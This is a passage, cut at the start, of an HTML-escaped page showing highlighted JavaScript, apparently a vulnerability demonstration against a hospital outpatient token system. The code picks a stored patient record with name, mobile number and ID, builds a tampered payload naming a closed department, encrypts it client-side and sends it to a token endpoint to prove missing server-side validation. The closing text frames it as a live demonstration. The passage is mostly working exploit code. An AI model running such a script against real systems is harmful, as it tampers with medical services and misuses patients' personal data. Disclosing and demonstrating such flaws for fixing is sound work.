=&gt;</span> p.<span class=\"hljs-property\">patientId</span> == targetPatientId);\n    <span class=\"hljs-keyword\">if</span> (!patient) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">error</span>(<span class=\"hljs-string\">\"Patient not found\"</span>);\n    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">\"👤 Selected:\"</span>, patient.<span class=\"hljs-property\">patientName</span>);\n\n    <span class=\"hljs-comment\">// Step 3: Build payload</span>\n    <span class=\"hljs-keyword\">let</span> payload = {\n        <span class=\"hljs-attr\">full_name</span>: patient.<span class=\"hljs-property\">patientName</span>,\n        <span class=\"hljs-attr\">mobile</span>: patient.<span class=\"hljs-property\">mobileNumber</span>,\n        <span class=\"hljs-attr\">department</span>: closedDeptCode,\n        <span class=\"hljs-title class_\">Uhid</span>: patient.<span class=\"hljs-property\">patientId</span>,\n        <span class=\"hljs-attr\">patientInitial</span>: patient.<span class=\"hljs-property\">patientInitial</span> || <span class=\"hljs-string\">\"\"</span>\n    };\n\n    <span class=\"hljs-comment\">// Step 4: Encrypt</span>\n    <span class=\"hljs-keyword\">let</span> encrypted = <span class=\"hljs-title function_\">encryptData</span>(payload);\n\n    <span class=\"hljs-comment\">// Step 5: Send</span>\n    <span class=\"hljs-keyword\">let</span> res2 = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">`generate_token.php?data=<span class=\"hljs-subst\">${<span class=\"hljs-built_in\">encodeURIComponent</span>(encrypted)}</span>`</span>);\n    <span class=\"hljs-keyword\">let</span> tokenData = <span class=\"hljs-keyword\">await</span> res2.<span class=\"hljs-title function_\">json</span>();\n    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(tokenData);\n    <span class=\"hljs-keyword\">if</span> (tokenData.<span class=\"hljs-property\">success</span>) {\n        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">`🚨 Token generated: <span class=\"hljs-subst\">${tokenData.token_no}</span> for closed OPD <span class=\"hljs-subst\">${closedDeptCode}</span>`</span>);\n    } <span class=\"hljs-keyword\">else</span> {\n        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">warn</span>(<span class=\"hljs-string\">\"Failed:\"</span>, tokenData.<span class=\"hljs-property\">message</span>);\n    }\n}\n\n<span class=\"hljs-title function_\">runFullDemo</span>();\n</code></pre></div>\n<p>You can use the <strong>six separate blocks</strong> during a live demonstration to explain each stage: data gathering, patient selection, payload tampering, encryption, and the unprotected endpoint. The final result is an undeniable proof of the missing server‑side validation.</p>\n",
